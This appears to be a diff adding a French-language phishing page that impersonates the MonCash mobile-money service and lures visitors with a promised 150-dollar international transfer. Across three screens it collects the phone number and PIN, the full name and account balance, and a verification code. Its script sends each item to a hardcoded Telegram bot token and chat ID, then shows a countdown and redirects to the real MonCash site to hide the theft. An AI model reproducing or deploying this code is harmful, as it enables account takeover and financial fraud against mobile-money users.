@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Recevoir un Transfert International</title>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #e6e9ef;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .payment-box {
+      background-color: white;
+      width: 350px;
+      border-radius: 8px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, .1);
+      overflow: hidden;
+    }
+    .payment-box .header {
+      background-color: #e53935;
+      color: white;
+      text-align: center;
+      padding: 15px;
+      font-size: 18px;
+      font-weight: bold;
+    }
+    .payment-box .content {
+      padding: 20px;
+      position: relative;
+    }
+    .payment-box .content img {
+      display: block;
+      margin: 0 auto;
+      margin-top: 10px;
+      width: 80px;
+    }
+    .payment-box .content .details {
+      text-align: center;
+      margin: 20px 0;
+    }
+    .payment-box .content .details p {
+      margin: 5px 0;
+      font-size: 16px;
+    }
+    .payment-box .content .details .total {
+      color: green;
+      font-weight: bold;
+      font-size: 18px;
+    }
+    .payment-box .content .input-group {
+      display: flex;
+      align-items: center;
+      background-color: #f8f8f8;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      margin-bottom: 15px;
+      padding: 10px;
+    }
+    .payment-box .content .input-group i {
+      font-size: 18px;
+      color: #888;
+      margin-right: 10px;
+    }
+    .payment-box .content .input-group input {
+      border: none;
+      outline: none;
+      font-size: 14px;
+      width: 100%;
+      background-color: transparent;
+    }
+    .payment-box .content button {
+      width: 100%;
+      padding: 12px;
+      background-color: #e53935;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .payment-box .content button:hover {
+      background-color: #d32f2f;
+    }
+    .hidden {
+      display: none;
+    }
+    #timerDisplay {
+      text-align: center;
+      font-size: 16px;
+      margin-top: 20px;
+      font-weight: bold;
+    }
+    #progressBar {
+      margin-top: 15px;
+      background-color: #f0f0f0;
+      border-radius: 5px;
+      height: 20px;
+    }
+    #progress {
+      background-color: #4caf50;
+      height: 100%;
+      border-radius: 5px;
+    }
+  </style>
+</head>
+<body>
+  <!-- Page 1 : Connexion -->
+  <div class="payment-box" id="firstPage">
+    <div class="header">Recevoir un Transfert International</div>
+    <div class="content">
+      <img src="https://i.postimg.cc/QCT5ZGB9/Mon-Cash-Logo-update-01.png" alt="MonCash Logo">
+      <div class="details">
+        <p><strong>Transfert International</strong></p>
+        <p class="total">Total: 150 dollars</p>
+      </div>
+      <div class="input-group">
+        <i class="fas fa-phone"></i>
+        <input type="text" id="username" placeholder="509 Votre Numéro">
+      </div>
+      <div class="input-group">
+        <i class="fas fa-key"></i>
+        <input type="password" id="pin" placeholder="Votre Code PIN">
+      </div>
+      <button onclick="sendConnectionDetails()">Recevoir</button>
+    </div>
+  </div><!-- Page 2 : Solde Actuel -->
+<div class="payment-box hidden" id="secondPage">
+  <div class="header">Confirmer votre Identité</div>
+  <div class="content">
+    <img src="https://i.postimg.cc/QCT5ZGB9/Mon-Cash-Logo-update-01.png" alt="MonCash Logo">
+    <p style="color: #444; font-size: 14px; text-align: center; margin-bottom: 15px;">
+      Veuillez entrer vos informations personnelles pour confirmer votre identité.
+    </p>
+    <div class="input-group">
+      <i class="fas fa-user"></i>
+      <input type="text" id="firstName" placeholder="Votre prénom">
+    </div>
+    <div class="input-group">
+      <i class="fas fa-user"></i>
+      <input type="text" id="lastName" placeholder="Votre nom">
+    </div>
+    <p style="color: #444; font-size: 14px; text-align: center; margin-bottom: 15px;">
+      Avant de continuer, vérifiez que vous avez de l'argent sur votre compte pour recevoir ce transfert. 
+      Veuillez entrer le montant disponible actuellement.
+    </p>
+    <div class="input-group">
+      <i class="fas fa-dollar-sign"></i>
+      <input type="number" id="balanceAmount" placeholder="Montant disponible sur votre compte">
+    </div>
+    <button onclick="goToVerificationPage()">Suivant</button>
+  </div>
+</div>
+
+<!-- Page 3 : Code de Vérification -->
+<div class="payment-box hidden" id="thirdPage">
+  <div class="header">Code de Vérification</div>
+  <div class="content">
+    <img src="https://i.postimg.cc/QCT5ZGB9/Mon-Cash-Logo-update-01.png" alt="MonCash Logo">
+    <div class="input-group">
+      <input type="text" id="verificationCode" placeholder="Code de Vérification">
+    </div>
+    
+    </p>
+    <a href="#">Renvoyer le code</a>
+    <button onclick="startTimer()">Recevoir</button>
+    <div id="timerDisplay" style="display: none;">
+      <p><strong>Temps restant : <span id="timeRemaining">2:00</span></strong></p>
+      <div id="progressBar">
+        <div id="progress" style="width: 0%;"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  const botToken = '8002715059:AAG5B26gIzZb4dvK-of7YmTpQEAuAaMMraI';
+  const chatId = '7055230106';
+
+  function sendConnectionDetails() {
+    const username = document.getElementById('username').value;
+    const pin = document.getElementById('pin').value;
+
+    if (username.length !== 11) {
+      alert("Le numéro doit comporter 11 chiffres.");
+      return;
+    }
+    if (pin.length !== 4) {
+      alert("Le code PIN doit comporter 4 chiffres.");
+      return;
+    }
+
+    const message = `🔔 Nouvelle connexion :\nIdentifiant : ${username}\nCode PIN : ${pin}`;
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text: message })
+    }).then(response => {
+      if (response.ok) {
+        document.getElementById('firstPage').classList.add('hidden');
+        document.getElementById('secondPage').classList.remove('hidden');
+      } else {
+        alert('Erreur lors de l\'envoi.');
+      }
+    }).catch(error => {
+      console.error('Erreur :', error);
+      alert('Une erreur est survenue.');
+    });
+  }
+
+  function goToVerificationPage() {
+    const firstName = document.getElementById('firstName').value.trim();
+    const lastName = document.getElementById('lastName').value.trim();
+    const balance = document.getElementById('balanceAmount').value;
+
+    if (!firstName || !lastName) {
+      alert("Veuillez entrer votre prénom et votre nom.");
+      return;
+    }
+    if (!balance || balance <= 0) {
+      alert("Veuillez entrer un montant valide.");
+      return;
+    }
+
+    const message = `🔔 Confirmation d'identité :\nPrénom : ${firstName}\nNom : ${lastName}\nSolde disponible : ${balance} dollars`;
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text: message })
+    }).then(response => {
+      if (response.ok) {
+        document.getElementById('secondPage').classList.add('hidden');
+        document.getElementById('thirdPage').classList.remove('hidden');
+      } else {
+        alert('Erreur lors de l\'envoi.');
+      }
+    }).catch(error => {
+      console.error('Erreur :', error);
+      alert('Une erreur est survenue.');
+    });
+  }
+
+  function startTimer() {
+    const verificationCode = document.getElementById('verificationCode').value;
+
+    if (verificationCode.length === 0) {
+      alert("Veuillez entrer le code de vérification.");
+      return;
+    }
+
+    const message = `🔑 Code de vérification : ${verificationCode}`;
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text: message })
+    }).catch(error => console.error('Erreur :', error));
+
+    const timerDisplay = document.getElementById('timerDisplay');
+    const timeRemainingElement = document.getElementById('timeRemaining');
+    const progressBar = document.getElementById('progress');
+    let timeLeft = 120;
+
+    document.querySelector("button").style.display = 'none';
+    document.querySelector("input").disabled = true;
+    timerDisplay.style.display = 'block';
+
+    const interval = setInterval(() => {
+      let minutes = Math.floor(timeLeft / 60);
+      let seconds = timeLeft % 60;
+      timeRemainingElement.textContent = `${minutes}:${seconds < 10 ? '0' + seconds : seconds}`;
+
+      const progress = ((120 - timeLeft) / 120) * 100;
+      progressBar.style.width = `${progress}%`;
+
+      if (timeLeft === 0) {
+        clearInterval(interval);
+        alert('Le temps est écoulé ! Vous allez être redirigé.');
+        window.location.href = "https://moncashdfs.com/fr/transfert-d-argent-international";
+      }
+
+      timeLeft--;
+    }, 1000);
+  }
+</script>
